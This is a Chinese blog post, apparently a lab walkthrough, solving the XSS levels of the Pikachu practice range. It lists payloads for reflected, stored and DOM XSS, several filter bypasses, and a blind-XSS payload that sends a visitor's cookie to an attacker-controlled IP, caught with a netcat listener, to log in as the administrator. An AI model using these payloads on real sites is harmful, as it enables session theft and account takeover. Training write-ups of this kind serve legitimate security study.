@@ -1,0 +1,260 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>pikachu靶场通关秘籍之XSS | 是苹果啊</title><meta name="keywords" content="pikachu"><meta name="author" content="是苹果啊"><meta name="copyright" content="是苹果啊"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="XSS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pikachu靶场通关秘籍之XSS">
+<meta property="og:url" content="https://ddd887.github.io/archives/77aee975.html">
+<meta property="og:site_name" content="是苹果啊">
+<meta property="og:description" content="XSS">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic.888888.al/i/2023/08/15/w4var1.jpg">
+<meta property="article:published_time" content="2022-10-12T09:56:24.708Z">
+<meta property="article:modified_time" content="2023-08-15T12:08:41.148Z">
+<meta property="article:author" content="是苹果啊">
+<meta property="article:tag" content="pikachu">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic.888888.al/i/2023/08/15/w4var1.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://ddd887.github.io/archives/77aee975"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="baidu-site-verification" content="code-zuJFBZJSKG"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'pikachu靶场通关秘籍之XSS',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-08-15 20:08:41'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/constown/HexoCustomFile@0.0.4/dist/css/custom.min.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://pic.888888.al/i/2023/08/15/qn7803.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fas fa-list"></i><span> 链接</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></li><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://pic.888888.al/i/2023/08/15/w4var1.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">是苹果啊</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fas fa-list"></i><span> 链接</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></li><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">pikachu靶场通关秘籍之XSS</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-10-12T09:56:24.708Z" title="发表于 2022-10-12 17:56:24">2022-10-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-08-15T12:08:41.148Z" title="更新于 2023-08-15 20:08:41">2023-08-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pikachu/">pikachu</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="pikachu靶场通关秘籍之XSS"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="跨站脚本攻击介绍"><a href="#跨站脚本攻击介绍" class="headerlink" title="跨站脚本攻击介绍"></a>跨站脚本攻击介绍</h2><p><strong>Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写”CSS”冲突，故又称XSS。一般XSS可以分为如下几种常见类型:</strong>  </p>
+<pre><code>    1.反射性XSS;
+    2.存储型XSS;
+    3.DOM型XSS;
+
+XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。
+XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。
+形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。
+因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理:
+  输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;
+  输出转义：根据输出点的位置对输出到前端的内容进行适当转义;  
+</code></pre>
+<h2 id="反射型XSS-get"><a href="#反射型XSS-get" class="headerlink" title="反射型XSS(get)"></a>反射型XSS(get)</h2><p>在输入框中输入 <strong>&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</strong> 即可：<br><img src="https://pic.888888.al/i/2023/08/15/w543ls.jpg" alt="1">  </p>
+<h2 id="反射型XSS-post"><a href="#反射型XSS-post" class="headerlink" title="反射型XSS(post)"></a>反射型XSS(post)</h2><p>先登录进去,同样在输入框中输入 <strong>&lt;script&gt;alert(1)&lt;/script&gt;</strong> 即可<br><img src="https://pic.888888.al/i/2023/08/15/w9qe68.jpg" alt="2">  </p>
+<h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p>存储型XSS又称持久型XSS，攻击脚本将被永久地存放在目标服务器的数据库或文件中，具有很高的隐蔽性。  </p>
+<p>同样在输入框中输入**&lt;script&gt;alert(1)&lt;&#x2F;script&gt;**，当有人浏览你的留言时都会触发XSS。<br><img src="https://pic.888888.al/i/2023/08/15/w6v9u2.jpg" alt="3">  </p>
+<h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><p>查看页面的源代码，找到输入框的位置，可以看到输入的东西在前端进行了过滤，所以只要把前面语法闭合掉，然后添加自己的语法即可,<strong>‘&gt;&lt;img src&#x3D;”#” onmouseover&#x3D;”alert(‘xss’)”&gt;</strong><br><img src="https://pic.888888.al/i/2023/08/15/w6v9u2.jpg" alt="4"><br><img src="https://pic.888888.al/i/2023/08/15/wca2cs.jpg" alt="5">  </p>
+<h2 id="DOM型XSS-X"><a href="#DOM型XSS-X" class="headerlink" title="DOM型XSS-X"></a>DOM型XSS-X</h2><p>同上一样的方法，审查一下js就好:<strong>‘&gt;&lt;img src&#x3D;”#” onmouseover&#x3D;”alert(‘xss’)”&gt;</strong><br><img src="https://pic.888888.al/i/2023/08/15/x3hn25.jpg" alt="6"><br><img src="https://pic.888888.al/i/2023/08/15/x3kut1.jpg" alt="7">  </p>
+<h2 id="XSS之盲打"><a href="#XSS之盲打" class="headerlink" title="XSS之盲打"></a>XSS之盲打</h2><p><strong>盲打就是前端不会做出任何反馈，只有后台管理员知道，你写了什么，这时候我们就要利用nc反弹来获得管理员的cookie，进而可以登录到后台。</strong>  </p>
+<p>我们用这个payload来打<strong>&lt;script&gt;var img&#x3D;document.createElement(“img”);img.src&#x3D;”http:&#x2F;&#x2F;[你的ip]:4444&#x2F;a?”+escape(document.cookie);&lt;&#x2F;script&gt;</strong><br><img src="https://pic.888888.al/i/2023/08/15/x461q3.jpg" alt="8">  </p>
+<p>提交完之后，我们用nc监听:</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>
+<p><img src="https://pic.888888.al/i/2023/08/15/x432fb.jpg" alt="9"><br><strong>当管理员进入后台，看到我们写的东西后，nc也就监听到了:</strong><br><img src="https://pic.888888.al/i/2023/08/15/x48n4m.jpg" alt="10">  </p>
+<h2 id="XSS之过滤"><a href="#XSS之过滤" class="headerlink" title="XSS之过滤"></a>XSS之过滤</h2><p>前端对我们提交的语句进行了过滤，考虑大小写绕过 <strong>&lt;Script&gt;alert(1)&lt;&#x2F;Script&gt;</strong><br><img src="https://pic.888888.al/i/2023/08/15/x4nemd.jpg" alt="11"></p>
+<h2 id="XSS之htmlspecialchars"><a href="#XSS之htmlspecialchars" class="headerlink" title="XSS之htmlspecialchars"></a>XSS之htmlspecialchars</h2><p>我们使用 <strong>‘ onclick&#x3D;’alert(1)’</strong>  payload去打:<br><img src="https://pic.888888.al/i/2023/08/15/x6i03l.jpg" alt="12"></p>
+<h2 id="XSS之href输出"><a href="#XSS之href输出" class="headerlink" title="XSS之href输出"></a>XSS之href输出</h2><p>通过分析得知直接使用js伪协议即可:<strong>javascript:alert(1)</strong><br><img src="https://pic.888888.al/i/2023/08/15/x6n2ms.jpg" alt="13"></p>
+<h2 id="XSS之js输出"><a href="#XSS之js输出" class="headerlink" title="XSS之js输出"></a>XSS之js输出</h2><p>通过分析得知， 他将我们输入的字符存到了js代码里面然后进行判断，我们可以根据代码写一个闭合:<strong>‘&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</strong><br><img src="https://pic.888888.al/i/2023/08/15/x705b8.jpg" alt="14"><br><img src="https://pic.888888.al/i/2023/08/15/x748s4.jpg" alt="15"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://ddd887.github.io">是苹果啊</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://ddd887.github.io/archives/77aee975.html">https://ddd887.github.io/archives/77aee975.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://ddd887.github.io" target="_blank">是苹果啊</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pikachu/">pikachu</a></div><div class="post_share"><div class="social-share" data-image="https://pic.888888.al/i/2023/08/15/w4var1.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://pic.888888.al/i/2023/08/15/sv49cq.jpg" rel="external nofollow noreferrer" target="_blank"><img class="post-qr-code-img" src="https://pic.888888.al/i/2023/08/15/sv49cq.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="https://pic.888888.al/i/2023/08/15/sv7xxm.jpg" rel="external nofollow noreferrer" target="_blank"><img class="post-qr-code-img" src="https://pic.888888.al/i/2023/08/15/sv7xxm.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/archives/f3a6c1ad.html"><img class="prev-cover" src="https://pic.888888.al/i/2023/08/15/w4var1.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">pikachu靶场通关秘籍之CSRF</div></div></a></div><div class="next-post pull-right"><a href="/archives/ec9ffc46.html"><img class="next-cover" src="https://pic.888888.al/i/2023/08/15/w4var1.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">pikachu靶场通关秘籍之暴力破解</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/archives/f3a6c1ad.html" title="pikachu靶场通关秘籍之CSRF"><img class="cover" src="https://pic.888888.al/i/2023/08/15/w4var1.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-12</div><div class="title">pikachu靶场通关秘籍之CSRF</div></div></a></div><div><a href="/archives/c4c569e3.html" title="pikachu靶场通关秘籍之SQL"><img class="cover" src="https://pic.888888.al/i/2023/08/15/w4var1.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-13</div><div class="title">pikachu靶场通关秘籍之SQL</div></div></a></div><div><a href="/archives/ec9ffc46.html" title="pikachu靶场通关秘籍之暴力破解"><img class="cover" src="https://pic.888888.al/i/2023/08/15/w4var1.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-12</div><div class="title">pikachu靶场通关秘籍之暴力破解</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://pic.888888.al/i/2023/08/15/qn7803.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">是苹果啊</div><div class="author-info__description">步履不停</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><a id="card-info-btn" target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/ddd887"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/ddd887" rel="external nofollow noreferrer" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:2301002710@qq.com" rel="external nofollow noreferrer" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://pic.888888.al/i/2023/08/15/12khmuy.png" rel="external nofollow noreferrer" target="_blank" title="QQ"><i class="fa-brands fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">开心最重要！！！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">跨站脚本攻击介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS-get"><span class="toc-number">2.</span> <span class="toc-text">反射型XSS(get)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS-post"><span class="toc-number">3.</span> <span class="toc-text">反射型XSS(post)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8BXSS"><span class="toc-number">4.</span> <span class="toc-text">存储型XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DOM%E5%9E%8BXSS"><span class="toc-number">5.</span> <span class="toc-text">DOM型XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DOM%E5%9E%8BXSS-X"><span class="toc-number">6.</span> <span class="toc-text">DOM型XSS-X</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E4%B9%8B%E7%9B%B2%E6%89%93"><span class="toc-number">7.</span> <span class="toc-text">XSS之盲打</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E4%B9%8B%E8%BF%87%E6%BB%A4"><span class="toc-number">8.</span> <span class="toc-text">XSS之过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E4%B9%8Bhtmlspecialchars"><span class="toc-number">9.</span> <span class="toc-text">XSS之htmlspecialchars</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E4%B9%8Bhref%E8%BE%93%E5%87%BA"><span class="toc-number">10.</span> <span class="toc-text">XSS之href输出</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E4%B9%8Bjs%E8%BE%93%E5%87%BA"><span class="toc-number">11.</span> <span class="toc-text">XSS之js输出</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/archives/afb5413b.html" title="KindEditor文件上传漏洞"><img src="https://pic.888888.al/i/2023/08/15/11byltz.jfif" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="KindEditor文件上传漏洞"/></a><div class="content"><a class="title" href="/archives/afb5413b.html" title="KindEditor文件上传漏洞">KindEditor文件上传漏洞</a><time datetime="2023-08-15T14:47:15.977Z" title="发表于 2023-08-15 22:47:15">2023-08-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/5a428c68.html" title="JAVA反序列化漏洞基础"><img src="https://pic.888888.al/i/2023/08/15/10yo3t9.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="JAVA反序列化漏洞基础"/></a><div class="content"><a class="title" href="/archives/5a428c68.html" title="JAVA反序列化漏洞基础">JAVA反序列化漏洞基础</a><time datetime="2023-04-23T13:00:50.304Z" title="发表于 2023-04-23 21:00:50">2023-04-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/c0777afa.html" title="Kerberos协议详解（转载）"><img src="https://pic.888888.al/i/2023/08/15/10sg7xc.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Kerberos协议详解（转载）"/></a><div class="content"><a class="title" href="/archives/c0777afa.html" title="Kerberos协议详解（转载）">Kerberos协议详解（转载）</a><time datetime="2023-03-18T06:35:51.221Z" title="发表于 2023-03-18 14:35:51">2023-03-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/a4ebb772.html" title="PTH传递"><img src="https://pic.888888.al/i/2023/08/15/10x54bu.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PTH传递"/></a><div class="content"><a class="title" href="/archives/a4ebb772.html" title="PTH传递">PTH传递</a><time datetime="2023-03-16T13:08:25.595Z" title="发表于 2023-03-16 21:08:25">2023-03-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/397dc553.html" title="域信息收集命令"><img src="https://pic.888888.al/i/2023/08/15/10jdgg7.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="域信息收集命令"/></a><div class="content"><a class="title" href="/archives/397dc553.html" title="域信息收集命令">域信息收集命令</a><time datetime="2023-03-15T09:09:19.260Z" title="发表于 2023-03-15 17:09:19">2023-03-15</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020d - 2023 By 是苹果啊</div><div class="footer_custom_text">到底啦，真的没有了😤</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  typeof preloader === 'object' && preloader.initLoading()
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
